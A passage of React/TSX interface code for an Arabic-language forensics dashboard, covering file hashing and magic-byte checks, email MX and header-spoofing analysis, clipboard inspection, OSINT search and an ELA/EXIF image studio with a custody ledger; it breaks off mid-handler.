                  ارفع أو اسحب أي ملف (صور، PDF، ملفات تنفيذية EXE/ELF، أرشيف ZIP، سكربتات، أو سجلات) لحساب بصمات WebCrypto (SHA-256 / SHA-512 / SHA-1 / MD5) وفحص الترويسة السحرية (Magic Bytes) وكشف انتحال الامتدادات وإنتروبيا شانون وحفظه في سجل الحيازة.
                </p>

                <div className="flex flex-wrap items-center gap-4">
                  <label className="cursor-pointer inline-flex items-center gap-2.5 px-6 py-3.5 bg-gradient-to-r from-[#D4AF37] to-[#b8972e] text-gray-950 font-bold rounded-xl shadow-lg hover:opacity-95 transition">
                    <Upload className="w-5 h-5" />
                    اختر أي ملف للفحص الجنائي
                    <input type="file" onChange={handleFileUpload} className="hidden" />
                  </label>

                  <button 
                    onClick={() => loadSampleImage('authentic')}
                    className="px-5 py-3.5 bg-gray-800 hover:bg-gray-700 text-gray-200 font-medium rounded-xl border border-gray-700 transition flex items-center gap-2 text-sm"
                  >
                    <Zap className="w-4 h-4 text-[#D4AF37]" />
                    عينة أصلية
                  </button>

                  <button 
                    onClick={() => loadSampleImage('deepfake')}
                    className="px-5 py-3.5 bg-gray-800 hover:bg-gray-700 text-gray-200 font-medium rounded-xl border border-gray-700 transition flex items-center gap-2 text-sm"
                  >
                    <AlertTriangle className="w-4 h-4 text-amber-400" />
                    عينة تزييف عميق
                  </button>
                </div>
              </div>
            </div>

            {isAnalyzing && (
              <div className="rounded-2xl bg-gray-900 border border-gray-800 p-12 text-center space-y-4">
                <RefreshCw className="w-10 h-10 text-[#D4AF37] animate-spin mx-auto" />
                <h3 className="text-lg font-bold text-white">جاري حساب بصمات WebCrypto وفحص ترويسة Magic Bytes...</h3>
                <p className="text-xs text-gray-400 font-mono">SHA-256 / SHA-512 / SHA-1 / MD5 • Magic Bytes Signature • Shannon Entropy</p>
                <div className="pt-2">
                  <button
                    type="button"
                    onClick={() => setIsAnalyzing(false)}
                    className="px-4 py-2 bg-gray-800 hover:bg-gray-700 text-gray-300 text-xs rounded-xl border border-gray-700 transition"
                  >
                    إلغاء أو إعادة المحاولة
                  </button>
                </div>
              </div>
            )}

            {!isAnalyzing && analysisResult && (
              <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
                <div className="lg:col-span-1 space-y-6">
                  <div className="rounded-2xl bg-gray-900 border border-gray-800 p-5 space-y-4">
                    <h3 className="text-sm font-bold text-gray-200">
                      {selectedImage ? 'الصورة المفحوصة' : 'بيانات الملف المفحوص'}
                    </h3>
                    {selectedImage ? (
                      <div className="relative rounded-xl overflow-hidden bg-black border border-gray-800 aspect-video flex items-center justify-center">
                        <img src={selectedImage} alt="Target" className="max-h-full max-w-full object-contain" />
                      </div>
                    ) : (
                      <div className="rounded-xl bg-gray-950 border border-gray-800 p-6 flex flex-col items-center justify-center gap-3 text-center">
                        <div className={`w-14 h-14 rounded-2xl flex items-center justify-center border ${
                          analysisResult.isMasqueraded ? 'bg-red-500/10 border-red-500/40 text-red-400' : 'bg-[#D4AF37]/10 border-[#D4AF37]/30 text-[#D4AF37]'
                        }`}>
                          <FileCode className="w-7 h-7" />
                        </div>
                        <div className="text-sm font-bold text-white break-all">{analysisResult.fileName}</div>
                        <div className="text-[11px] font-mono text-emerald-400">{analysisResult.detectedFileType}</div>
                      </div>
                    )}
                    <div className="grid grid-cols-2 gap-2 text-xs text-gray-400 pt-2 border-t border-gray-800">
                      <div>الحجم: <span className="text-white font-mono">{analysisResult.fileSizeFormatted}</span></div>
                      <div>{analysisResult.width > 0 ? 'الأبعاد:' : 'MIME:'} <span className="text-white font-mono truncate">{analysisResult.width > 0 ? `${analysisResult.width}×${analysisResult.height}px` : analysisResult.mimeType}</span></div>
                      <div className="col-span-2">آخر تعديل: <span className="text-white font-mono">{analysisResult.lastModified}</span></div>
                    </div>
                  </div>

                  <div className="rounded-2xl bg-gray-900 border border-gray-800 p-6 text-center space-y-4 shadow-xl">
                    <h3 className="text-sm font-medium text-gray-400">نسبة الأصالة وسلامة التوقيع</h3>
                    <div className="text-3xl font-bold font-mono text-white">{analysisResult.authenticityScore}%</div>
                    
                    <div className={`p-3 rounded-xl border text-xs font-medium leading-relaxed ${
                      analysisResult.authenticityScore >= 85 ? 'bg-[#10B981]/10 border-[#10B981]/30 text-[#10B981]' :
                      analysisResult.authenticityScore >= 50 ? 'bg-amber-500/10 border-amber-500/30 text-amber-400' :
                      'bg-red-500/10 border-red-500/30 text-red-400'
                    }`}>
                      {analysisResult.verdict}
                    </div>

                    {lastAnalyzedEvidenceId && (
                      <button
                        onClick={() => fetchCustodyHistory(lastAnalyzedEvidenceId)}
                        className="w-full py-2.5 bg-emerald-500/15 hover:bg-emerald-500/25 text-emerald-400 border border-emerald-500/30 text-xs font-bold rounded-xl transition flex items-center justify-center gap-2"
                      >
                        <History className="w-4 h-4" />
                        فتح سلسلة الحيازة المشفرة للدليل
                      </button>
                    )}

                    <button
                      onClick={() => setActiveTab('hex')}
                      className="w-full py-2.5 bg-gray-800 hover:bg-gray-700 text-gray-200 text-xs font-medium rounded-xl transition flex items-center justify-center gap-2"
                    >
                      <Code className="w-4 h-4 text-[#D4AF37]" />
                      فحص مصفوفة Hex والبايتات السحرية
                    </button>

                    <button 
                      onClick={downloadAuditReport}
                      className="w-full py-2.5 bg-gray-800 hover:bg-gray-700 text-gray-200 text-xs font-medium rounded-xl transition flex items-center justify-center gap-2"
                    >
                      <Download className="w-4 h-4 text-[#D4AF37]" />
                      تصدير التقرير الفعلي (JSON)
                    </button>

                    <button 
                      onClick={() => setShowPrintModal(true)}
                      className="w-full py-2.5 bg-[#D4AF37] hover:bg-[#c29f30] text-gray-950 font-bold text-xs rounded-xl transition flex items-center justify-center gap-2 shadow-lg"
                    >
                      <FileText className="w-4 h-4" />
                      تصدير شهادة الدليل الحالي (PDF)
                    </button>

                    <button 
                      onClick={() => setActiveTab('reports')}
                      className="w-full py-2.5 bg-emerald-500/15 hover:bg-emerald-500/25 text-emerald-400 border border-emerald-500/30 font-bold text-xs rounded-xl transition flex items-center justify-center gap-2"
                    >
                      <ShieldCheck className="w-4 h-4" />
                      تجميع الأدلة وإصدار تقرير قضية موثق
                    </button>
                  </div>
                </div>

                <div className="lg:col-span-2 space-y-6">
                  {/* Masquerade Warning Banner */}
                  {analysisResult.isMasqueraded && (
                    <div className="bg-red-500/10 border border-red-500/40 p-5 rounded-2xl flex items-start gap-3 text-red-400">
                      <AlertOctagon className="w-6 h-6 shrink-0 mt-0.5" />
                      <div className="space-y-1">
                        <div className="text-sm font-bold">تحذير تزوير وتنكر امتداد حرج (Extension Spoofing Detected)</div>
                        <p className="text-xs leading-relaxed">{analysisResult.masqueradeWarning}</p>
                      </div>
                    </div>
                  )}

                  {/* Magic Bytes & Entropy Forensic Card */}
                  <div className="rounded-2xl bg-gray-900 border border-gray-800 p-6 space-y-4">
                    <div className="flex items-center justify-between">
                      <h3 className="text-sm font-bold text-white flex items-center gap-2">
                        <FileCheck className="w-4 h-4 text-[#D4AF37]" />
                        تحليل الترويسة السحرية وإنتروبيا شانون (Magic Bytes & Entropy)
                      </h3>
                      <span className={`px-2.5 py-1 rounded-lg text-[10px] font-bold font-mono ${
                        analysisResult.isMasqueraded
                          ? 'bg-red-500/15 text-red-400 border border-red-500/30'
                          : 'bg-emerald-500/15 text-emerald-400 border border-emerald-500/30'
                      }`}>
                        {analysisResult.isMasqueraded ? 'MASQUERADE ALERT' : 'SIGNATURE VERIFIED'}
                      </span>
                    </div>

                    <div className="grid grid-cols-1 md:grid-cols-3 gap-3">
                      <div className="bg-gray-950 p-3.5 rounded-xl border border-gray-800 space-y-1">
                        <span className="text-[10px] text-gray-500 uppercase font-mono">التوقيع المكتشف (Magic Bytes)</span>
                        <div className="text-xs font-bold text-emerald-400">{analysisResult.detectedFileType}</div>
                      </div>
                      <div className="bg-gray-950 p-3.5 rounded-xl border border-gray-800 space-y-1">
                        <span className="text-[10px] text-gray-500 uppercase font-mono">الامتدادات المتوقعة</span>
                        <div className="text-xs font-mono text-gray-200">
                          {analysisResult.expectedExtensions && analysisResult.expectedExtensions.length > 0
                            ? analysisResult.expectedExtensions.map(ext => `.${ext}`).join(', ')
                            : 'عام / نصي'}
                        </div>
                      </div>
                      <div className="bg-gray-950 p-3.5 rounded-xl border border-gray-800 space-y-2">
                        <div className="flex items-center justify-between">
                          <span className="text-[10px] text-gray-500 uppercase font-mono">إنتروبيا شانون</span>
                          <span className="text-xs font-bold font-mono text-[#D4AF37]">{analysisResult.entropy ?? 0} / 8.0</span>
                        </div>
                        <div className="w-full h-1.5 bg-gray-800 rounded-full overflow-hidden">
                          <div
                            className={`h-full ${(analysisResult.entropy ?? 0) >= 7.2 ? 'bg-red-500' : (analysisResult.entropy ?? 0) >= 6.0 ? 'bg-amber-500' : 'bg-[#10B981]'}`}
                            style={{ width: `${Math.min(100, ((analysisResult.entropy ?? 0) / 8) * 100)}%` }}
                          />
                        </div>
                        <div className="text-[10px] text-gray-400">{analysisResult.entropyClassification}</div>
                      </div>
                    </div>

                    {analysisResult.headerHex && (
                      <div className="bg-gray-950 p-3.5 rounded-xl border border-gray-800 font-mono text-xs space-y-2">
                        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2">
                          <span className="text-gray-400">أول 16 بايت (Header Hex):</span>
                          <span className="text-emerald-400 select-all break-all">{analysisResult.headerHex}</span>
                        </div>
                        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2 pt-2 border-t border-gray-800">
                          <span className="text-gray-400">ASCII Preview:</span>
                          <span className="text-[#D4AF37] select-all bg-black/50 px-2 py-0.5 rounded">{analysisResult.headerAscii}</span>
                        </div>
                      </div>
                    )}
                  </div>

                  {/* Real WebCrypto Hashes Card */}
                  <div className="rounded-2xl bg-gray-900 border border-gray-800 p-6 space-y-4">
                    <h3 className="text-sm font-bold text-white">بصمات التشفير الحقيقية (WebCrypto Hashes)</h3>
                    
                    <div className="space-y-3 font-mono text-xs">
                      <div className="bg-gray-950 p-3 rounded-xl border border-gray-800 space-y-1">
                        <div className="flex items-center justify-between text-gray-400">
                          <span>SHA-256 Hash:</span>
                          <button onClick={() => copyToClipboard(analysisResult.sha256, 'sha256')} className="text-[#D4AF37] hover:underline flex items-center gap-1">
                            {copiedHash === 'sha256' ? <Check className="w-3.5 h-3.5 text-[#10B981]" /> : <Copy className="w-3.5 h-3.5" />}
                            {copiedHash === 'sha256' ? 'تم النسخ' : 'نسخ'}
                          </button>
                        </div>
                        <div className="text-emerald-400 break-all">{analysisResult.sha256}</div>
                      </div>

                      {analysisResult.sha512 && (
                        <div className="bg-gray-950 p-3 rounded-xl border border-gray-800 space-y-1">
                          <div className="flex items-center justify-between text-gray-400">
                            <span>SHA-512 Hash:</span>
                            <button onClick={() => copyToClipboard(analysisResult.sha512!, 'sha512')} className="text-[#D4AF37] hover:underline flex items-center gap-1">
                              {copiedHash === 'sha512' ? <Check className="w-3.5 h-3.5 text-[#10B981]" /> : <Copy className="w-3.5 h-3.5" />}
                              {copiedHash === 'sha512' ? 'تم النسخ' : 'نسخ'}
                            </button>
                          </div>
                          <div className="text-emerald-400 break-all text-[11px]">{analysisResult.sha512}</div>
                        </div>
                      )}

                      <div className="bg-gray-950 p-3 rounded-xl border border-gray-800 space-y-1">
                        <div className="flex items-center justify-between text-gray-400">
                          <span>SHA-1 Hash:</span>
                          <button onClick={() => copyToClipboard(analysisResult.sha1, 'sha1')} className="text-[#D4AF37] hover:underline flex items-center gap-1">
                            {copiedHash === 'sha1' ? <Check className="w-3.5 h-3.5 text-[#10B981]" /> : <Copy className="w-3.5 h-3.5" />}
                            {copiedHash === 'sha1' ? 'تم النسخ' : 'نسخ'}
                          </button>
                        </div>
                        <div className="text-emerald-400 break-all">{analysisResult.sha1}</div>
                      </div>

                      <div className="bg-gray-950 p-3 rounded-xl border border-gray-800 space-y-1">
                        <div className="flex items-center justify-between text-gray-400">
                          <span>MD5 Hash:</span>
                          <button onClick={() => copyToClipboard(analysisResult.md5, 'md5')} className="text-[#D4AF37] hover:underline flex items-center gap-1">
                            {copiedHash === 'md5' ? <Check className="w-3.5 h-3.5 text-[#10B981]" /> : <Copy className="w-3.5 h-3.5" />}
                            {copiedHash === 'md5' ? 'تم النسخ' : 'نسخ'}
                          </button>
                        </div>
                        <div className="text-emerald-400 break-all">{analysisResult.md5}</div>
                      </div>
                    </div>
                  </div>

                  {/* SOC Verdict & Forensic Report */}
                  <div className="rounded-2xl bg-gray-900 border border-gray-800 p-6 space-y-4">
                    <h3 className="text-sm font-bold text-white">تقرير التحليل الجنائي السيادي (Binary & Structural Forensics)</h3>
                    <p className="text-sm text-gray-300 leading-relaxed bg-gray-950 p-4 rounded-xl border border-gray-800">
                      {analysisResult.localReport.detailedReport}
                    </p>

                    <div className="space-y-2">
                      <span className="text-xs font-bold text-gray-400">مؤشرات الفحص الجنائي:</span>
                      <ul className="space-y-1.5">
                        {analysisResult.localReport.indicators.map((ind, idx) => (
                          <li key={idx} className="text-xs text-gray-300 flex items-center gap-2 bg-gray-950 px-3 py-2.5 rounded-lg border border-gray-800">
                            <span className="w-2 h-2 rounded-full bg-[#10B981]"></span>
                            {ind}
                          </li>
                        ))}
                      </ul>
                    </div>
                  </div>
                </div>
              </div>
            )}

            {!analysisResult && !isAnalyzing && (
              <div className="rounded-2xl bg-gray-900/50 border border-dashed border-gray-800 p-12 text-center space-y-3">
                <FileSearch className="w-12 h-12 text-gray-600 mx-auto" />
                <h3 className="text-base font-bold text-gray-300">لم تقم برفع أي ملف بعد</h3>
                <p className="text-xs text-gray-500">يمكنك سحب وإفلات أي ملف هنا أو النقر على زر الرفع أعلاه لحساب SHA-256 وفحص Magic Bytes فوراً.</p>
              </div>
            )}
          </div>
        )}

        {/* Tab: Email Forensic & Live DNS MX Checker */}
        {isTabVisible('email') && (
          <div className="space-y-6">
            <div className="rounded-2xl bg-gray-900 border border-gray-800 p-6 space-y-6">
              <div className="flex items-center justify-between pb-4 border-b border-gray-800">
                <div>
                  <h2 className="text-lg font-bold text-white">فحص الإيميلات والانتهاكات الحي (Live DNS MX & Domain Checker)</h2>
                  <p className="text-xs text-gray-400">استعلام حقيقي عبر DNS-over-HTTPS للتحقق من سجلات الـ MX ونطاقات البريد الوهمية أو الرسمية.</p>
                </div>
                <Mail className="w-6 h-6 text-[#D4AF37]" />
              </div>

              <div className="space-y-4">
                <h3 className="text-sm font-bold text-gray-200">التحقق الحي من النطاق وسجلات خوادم البريد (MX Records Lookup)</h3>
                <form onSubmit={checkEmailForensics} className="flex flex-col sm:flex-row gap-3">
                  <input
                    type="email"
                    value={targetEmail}
                    onChange={(e) => setTargetEmail(e.target.value)}
                    placeholder="أدخل البريد الإلكتروني للفحص الحي (مثل user@gmail.com)..."
                    className="flex-1 px-4 py-3 bg-gray-950 border border-gray-800 rounded-xl text-sm text-white focus:outline-none focus:border-[#D4AF37]"
                    required
                  />
                  <button
                    type="submit"
                    disabled={emailLoading}
                    className="px-6 py-3 bg-gradient-to-r from-[#D4AF37] to-[#b8972e] text-gray-950 font-bold rounded-xl shadow-lg hover:opacity-95 transition flex items-center justify-center gap-2 text-sm whitespace-nowrap"
                  >
                    {emailLoading ? <RefreshCw className="w-4 h-4 animate-spin" /> : <Globe className="w-4 h-4" />}
                    استعلام DNS الحي
                  </button>
                </form>

                {emailCheckResult && (
                  <div className="rounded-xl bg-gray-950 p-6 border border-gray-800 space-y-4">
                    <div className="flex items-center justify-between pb-3 border-b border-gray-800">
                      <div>
                        <span className="text-xs text-gray-400">البريد المفحوص:</span>
                        <span className="text-white font-mono font-bold block">{emailCheckResult.email}</span>
                      </div>
                      <span className={`px-3 py-1 rounded-full text-xs font-bold ${
                        emailCheckResult.isDisposable ? 'bg-red-500/10 text-red-400 border border-red-500/30' : 'bg-[#10B981]/10 text-[#10B981] border border-[#10B981]/30'
                      }`}>
                        {emailCheckResult.isDisposable ? 'بريد مؤقت محظور (Temp-mail)' : 'نطاق رسمي موثوق'}
                      </span>
                    </div>

                    <div className="space-y-2">
                      <span className="text-xs font-bold text-gray-400">نتيجة التحقق من سجلات الـ MX الحية:</span>
                      <p className="text-xs text-gray-300 bg-gray-900 p-3 rounded-lg border border-gray-800">
                        {emailCheckResult.domainInfo}
                      </p>
                      {emailCheckResult.mxServers.length > 0 && (
                        <div className="text-[11px] font-mono text-emerald-400 bg-gray-900/50 p-2.5 rounded-lg border border-gray-800">
                          خوادم البريد النشطة (MX): {emailCheckResult.mxServers.join(' | ')}
                        </div>
                      )}
                    </div>

                    <div className="space-y-2">
                      <span className="text-xs font-bold text-gray-400">التقرير الجنائي للسجلات الحية:</span>
                      <div className="p-3 rounded-lg bg-[#10B981]/10 border border-[#10B981]/20 text-xs text-[#10B981]">
                        {emailCheckResult.breachStatus}
                      </div>
                    </div>
                  </div>
                )}
              </div>

              {/* Email Header Spoofing Analyzer */}
              <div className="space-y-4 pt-6 border-t border-gray-800">
                <h3 className="text-sm font-bold text-gray-200">فاحص ترويسة البريد وكشف التزييف (Email Header Spoofing Analyzer)</h3>
                <p className="text-xs text-gray-400">قم بلصق ترويسة الرسالة الكاملة (Raw Email Headers) لكشف ما إذا تم تزييف اسم المرسل.</p>
                
                <form onSubmit={analyzeEmailHeader} className="space-y-3">
                  <textarea
                    rows={4}
                    value={emailHeaderInput}
                    onChange={(e) => setEmailHeaderInput(e.target.value)}
                    placeholder="الصق ترويسة الإيميل هنا (From, Return-Path, Received, Authentication-Results)..."
                    className="w-full p-4 bg-gray-950 border border-gray-800 rounded-xl text-xs font-mono text-white focus:outline-none focus:border-[#D4AF37]"
                    required
                  ></textarea>
                  <button
                    type="submit"
                    className="px-6 py-3 bg-gray-800 hover:bg-gray-700 text-gray-200 font-medium rounded-xl border border-gray-700 transition flex items-center gap-2 text-xs"
                  >
                    <Server className="w-4 h-4 text-[#D4AF37]" />
                    تحليل الترويسة وكشف الـ Spoofing
                  </button>
                </form>

                {headerResult && (
                  <div className="rounded-xl bg-gray-950 p-6 border border-gray-800 space-y-4">
                    <div className={`p-3 rounded-xl border text-xs font-medium leading-relaxed ${
                      headerResult.isSpoofed ? 'bg-red-500/10 border-red-500/30 text-red-400' : 'bg-[#10B981]/10 border-[#10B981]/30 text-[#10B981]'
                    }`}>
                      {headerResult.verdict}
                    </div>

                    <div className="grid grid-cols-1 md:grid-cols-2 gap-3 text-xs">
                      <div className="bg-gray-900 p-3 rounded-lg border border-gray-800">
                        <span className="text-gray-400 block">المرسل المعروض (From):</span>
                        <span className="text-white font-mono break-all">{headerResult.from}</span>
                      </div>
                      <div className="bg-gray-900 p-3 rounded-lg border border-gray-800">
                        <span className="text-gray-400 block">مسار العودة (Return-Path):</span>
                        <span className="text-white font-mono break-all">{headerResult.returnPath}</span>
                      </div>
                    </div>

                    <div className="grid grid-cols-3 gap-3 text-xs text-center font-mono">
                      <div className="bg-gray-900 p-3 rounded-lg border border-gray-800">
                        <span className="text-gray-400 block mb-1">SPF</span>
                        <span className={headerResult.spf.includes('PASS') ? 'text-[#10B981]' : 'text-red-400'}>{headerResult.spf}</span>
                      </div>
                      <div className="bg-gray-900 p-3 rounded-lg border border-gray-800">
                        <span className="text-gray-400 block mb-1">DKIM</span>
                        <span className={headerResult.dkim.includes('PASS') ? 'text-[#10B981]' : 'text-red-400'}>{headerResult.dkim}</span>
                      </div>
                      <div className="bg-gray-900 p-3 rounded-lg border border-gray-800">
                        <span className="text-gray-400 block mb-1">DMARC</span>
                        <span className={headerResult.dmarc.includes('PASS') ? 'text-[#10B981]' : 'text-red-400'}>{headerResult.dmarc}</span>
                      </div>
                    </div>
                  </div>
                )}
              </div>
            </div>
          </div>
        )}

        {/* Tab: Live Clipboard Inspector */}
        {isTabVisible('clipboard') && (
          <div className="rounded-2xl bg-gray-900 border border-gray-800 p-6 space-y-6">
            <div className="flex items-center justify-between pb-4 border-b border-gray-800">
              <div>
                <h2 className="text-lg font-bold text-white">فحص الحافظة الحية (Live Clipboard Inspection)</h2>
                <p className="text-xs text-gray-400">قراءة النص أو الرابط المنسوخ حالياً في ذاكرة الهاتف وفحصه أمنياً.</p>
              </div>
              <Clipboard className="w-6 h-6 text-[#D4AF37]" />
            </div>

            <div className="space-y-4">
              <button
                onClick={inspectLiveClipboard}
                disabled={clipboardLoading}
                className="px-6 py-3.5 bg-gradient-to-r from-[#D4AF37] to-[#b8972e] text-gray-950 font-bold rounded-xl shadow-lg hover:opacity-95 transition flex items-center gap-2 text-sm"
              >
                {clipboardLoading ? <RefreshCw className="w-4 h-4 animate-spin" /> : <Clipboard className="w-4 h-4" />}
                قراءة محتوى الحافظة الآن
              </button>

              {clipboardResult && (
                <div className="rounded-xl bg-gray-950 p-6 border border-gray-800 space-y-4">
                  <div className="flex items-center justify-between">
                    <span className="text-xs font-mono text-gray-400">وقت القراءة: {clipboardResult.timestamp}</span>
                    <span className={`px-3 py-1 rounded-full text-xs font-bold ${
                      clipboardResult.threatLevel === 'آمن' ? 'bg-[#10B981]/10 text-[#10B981]' :
                      clipboardResult.threatLevel === 'مشبوه' ? 'bg-amber-500/10 text-amber-400' :
                      'bg-red-500/10 text-red-400'
                    }`}>
                      {clipboardResult.threatLevel}
                    </span>
                  </div>

                  <div className="space-y-1">
                    <span className="text-xs text-gray-500">النص أو الرابط المقروء من الحافظة:</span>
                    <div className="p-3 bg-gray-900 rounded-lg font-mono text-xs text-white break-all border border-gray-800">
                      {clipboardResult.text}
                    </div>
                  </div>

                  <div className="space-y-1">
                    <span className="text-xs text-gray-500">تقرير التحليل الأمني:</span>
                    <p className="text-sm text-gray-300 bg-gray-900 p-3 rounded-lg border border-gray-800">
                      {clipboardResult.analysis}
                    </p>
                  </div>
                </div>
              )}
            </div>
          </div>
        )}



        {/* Tab: Google Search Grounding */}
        {isTabVisible('search') && (
          <div className="rounded-2xl bg-gray-900 border border-gray-800 p-6 space-y-6">
            <div className="flex items-center justify-between pb-4 border-b border-gray-800">
              <div>
                <h2 className="text-lg font-bold text-white">بحث المخابرات السيبرانية الموجه (Live Threat Hunting & OSINT Core)</h2>
                <p className="text-xs text-gray-400">البحث المباشر عبر الإنترنت للتحقق من أحدث الثغرات، التهديدات، أو الروابط المشبوهة.</p>
              </div>
              <Search className="w-6 h-6 text-[#D4AF37]" />
            </div>

            <form onSubmit={performSearchGrounding} className="flex gap-3">
              <input
                type="text"
                value={searchQuery}
                onChange={(e) => setSearchQuery(e.target.value)}
                placeholder="ابحث عن ثغرة أمنية، نطاق، أو معلومات تهديد..."
                className="flex-1 px-4 py-3 bg-gray-950 border border-gray-800 rounded-xl text-sm text-white focus:outline-none focus:border-[#D4AF37]"
                required
              />
              <button
                type="submit"
                disabled={searchLoading}
                className="px-6 py-3 bg-gradient-to-r from-[#D4AF37] to-[#b8972e] text-gray-950 font-bold rounded-xl shadow-lg hover:opacity-95 transition flex items-center gap-2 text-sm"
              >
                {searchLoading ? <RefreshCw className="w-4 h-4 animate-spin" /> : <Search className="w-4 h-4" />}
                بحث موجه
              </button>
            </form>

            {searchResult && (
              <div className="space-y-6">
                {searchResult.internalResults && searchResult.internalResults.length > 0 && (
                  <div className="space-y-3">
                    <h3 className="text-sm font-bold text-emerald-400 flex items-center gap-2">
                      <Database className="w-4 h-4" />
                      نتائج من قاعدة البيانات الداخلية
                    </h3>
                    <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
                      {searchResult.internalResults.map(res => (
                        <div key={res.id} className="bg-gray-950 border border-gray-800 p-3 rounded-xl flex items-center gap-3">
                          {res.fileUrl && res.mimeType.startsWith('image/') ? (
                            <img src={res.fileUrl} alt="" className="w-10 h-10 rounded object-cover" />
                          ) : (
                            <div className="w-10 h-10 rounded bg-gray-900 border border-gray-800 flex items-center justify-center shrink-0">
                              <FileCode className="w-5 h-5 text-[#D4AF37]" />
                            </div>
                          )}
                          <div>
                            <div className="text-xs font-bold text-white">{res.fileName}</div>
                            <div className="text-[9px] text-gray-500 font-mono">SHA-256: {res.sha256.substring(0, 16)}...</div>
                          </div>
                          <button 
                            onClick={() => {
                              setAnalysisResult(res.analysis);
                              setSelectedImage(res.fileUrl);
                              setLastAnalyzedEvidenceId(res.id);
                              setActiveTab('analyzer');
                            }}
                            className="mr-auto p-1.5 bg-gray-800 hover:bg-[#D4AF37] hover:text-gray-950 rounded transition"
                          >
                            <Search className="w-3 h-3" />
                          </button>
                        </div>
                      ))}
                    </div>
                  </div>
                )}

                <div className="bg-gray-950 p-6 rounded-xl border border-gray-800 space-y-4">
                  <h3 className="text-sm font-bold text-[#D4AF37] flex items-center gap-2">
                    <Globe className="w-4 h-4" />
                    نتائج البحث الاستخباراتي (OSINT)
                  </h3>
                  <div className="text-sm text-gray-300 bg-gray-900 p-4 rounded-xl border border-gray-800 leading-relaxed whitespace-pre-wrap">
                    {searchResult.result}
                  </div>
                  
                  {searchResult.sources.length > 0 && (
                    <div className="space-y-2">
                      <span className="text-xs font-bold text-gray-400 block mb-2">المصادر المفتوحة:</span>
                      <ul className="space-y-2">
                        {searchResult.sources.map((src, i) => (
                          <li key={i} className="text-xs text-[#D4AF37]">
                            <a href={sanitizeSafeHref(src.uri)} target="_blank" rel="noopener noreferrer" className="hover:underline flex items-center gap-1.5">
                              <Globe className="w-3 h-3" />
                              {src.title} ({src.uri})
                            </a>
                          </li>
                        ))}
                      </ul>
                    </div>
                  )}
                </div>
              </div>
            )}
          </div>
        )}

        {isTabVisible('ela') && (
          <div className="space-y-6">
            {/* Interactive ELA & EXIF Studio Header + Uploader */}
            <div
              onDragOver={(e) => { e.preventDefault(); setIsDraggingEla(true); }}
              onDragLeave={() => setIsDraggingEla(false)}
              onDrop={(e) => {
                e.preventDefault();
                setIsDraggingEla(false);
                const dropped = e.dataTransfer.files?.[0];
                if (dropped) {
                  dropped.arrayBuffer().then(buf => {
                    const blobUrl = URL.createObjectURL(new Blob([buf], { type: dropped.type || 'image/jpeg' }));
                    processImageFile(blobUrl, dropped.name, dropped.size, formatFileSize(dropped.size), new Date(dropped.lastModified).toISOString(), dropped.type || 'image/jpeg', buf);
                  });
                }
              }}
              className={`rounded-2xl bg-gray-900 border-2 border-dashed p-6 space-y-5 transition ${
                isDraggingEla ? 'border-[#D4AF37] bg-[#D4AF37]/5' : 'border-gray-800'
              }`}
            >
              <div className="flex flex-col lg:flex-row lg:items-center justify-between gap-4">
                <div>
                  <h2 className="text-lg font-bold text-white flex items-center gap-2">
                    <Sliders className="w-5 h-5 text-[#D4AF37]" />
                    استوديو ELA واستخراج بيانات EXIF والـ GPS الحقيقية
                  </h2>
                  <p className="text-xs text-gray-400">
                    فحص مستوى الخطأ الضغطي (Error Level Analysis) وقراءة ترويسة TIFF/EXIF الثنائية لاستخراج تاريخ الالتقاط الدقيق وإحداثيات GPS.
                  </p>
                </div>
                <div className="flex flex-wrap items-center gap-2">
                  <label className="cursor-pointer px-4 py-2 bg-[#D4AF37] hover:bg-[#c29f30] text-gray-950 font-bold rounded-xl text-xs transition inline-flex items-center gap-2">
                    <Upload className="w-4 h-4" />
                    رفع صورة للفحص (JPEG / PNG / WebP)
                    <input
                      type="file"
                      accept="image/jpeg,image/png,image/webp,image/*"
                      onChange={(e) => {
                        const f = e.target.files?.[0];
                        e.target.value = '';
                        if (f) {
                          f.arrayBuffer().then(buf => {
                            const blobUrl = URL.createObjectURL(new Blob([buf], { type: f.type || 'image/jpeg' }));
                            processImageFile(blobUrl, f.name, f.size, formatFileSize(f.size), new Date(f.lastModified).toISOString(), f.type || 'image/jpeg', buf);
                          });
                        }
                      }}
                      className="hidden"
                    />
                  </label>
                  <button
                    onClick={loadSampleExifGpsImage}
                    disabled={isAnalyzing}
                    className="px-3.5 py-2 bg-gray-800 hover:bg-gray-700 text-emerald-400 border border-emerald-500/30 rounded-xl text-xs font-medium transition inline-flex items-center gap-1.5"
                  >
                    <MapPin className="w-3.5 h-3.5" />
                    تجربة صورة بـ EXIF و GPS مدمج
                  </button>
                  {evidenceList.some(ev => ev.mimeType.startsWith('image/') || /\.(jpg|jpeg|png|webp|gif|bmp)$/i.test(ev.fileName)) && (
                    <select
                      value=""
                      onChange={async (e) => {
                        const ev = evidenceList.find(item => item.id === e.target.value);
                        if (!ev) return;
                        const cached = localFilesCacheRef.current.get(ev.sha256);
                        if (cached) {
                          const buf = await cached.blob.arrayBuffer();
                          const blobUrl = URL.createObjectURL(cached.blob);
                          await processImageFile(blobUrl, ev.fileName, ev.fileSize, formatFileSize(ev.fileSize), ev.createdAt, ev.mimeType, buf);
                          return;
                        }
                        if (!ev.fileUrl) {
                          notifyStatus('رابط الصورة غير متاح محلياً أو سحابياً. ارفع الملف مجدداً لفحصه بالـ Canvas.', 'warning');
                          return;
                        }
                        setIsAnalyzing(true);
                        setImageName(ev.fileName);
                        setSelectedImage(ev.fileUrl);
                        setAnalysisResult(ev.analysis);
                        setLastAnalyzedEvidenceId(ev.id);
                        const img = new Image();
                        if (!ev.fileUrl.startsWith('blob:') && !ev.fileUrl.startsWith('data:')) {
                          img.crossOrigin = 'anonymous';
                        }
                        img.onload = async () => {
                          try {
                            const { url, result: elaRes } = await generateRealELA(img, elaSlider, elaQuality, elaMode);
                            setElaImage(url);
                            await recordCustodyLedgerBlock(
                              ev.id,
                              'FILE_INSPECTION',
                              `فحص صورة محفوظة بمحرك Canvas ELA (${ev.fileName})`,
                              'استوديو ELA السحابي',
                              `احتمال التلاعب: ${elaRes.elaTamperScore}% | بؤر شاذة: ${elaRes.suspiciousBlocksCount}`
                            );
                          } finally {
                            setIsAnalyzing(false);
                          }
                        };
                        img.onerror = () => {
                          setIsAnalyzing(false);
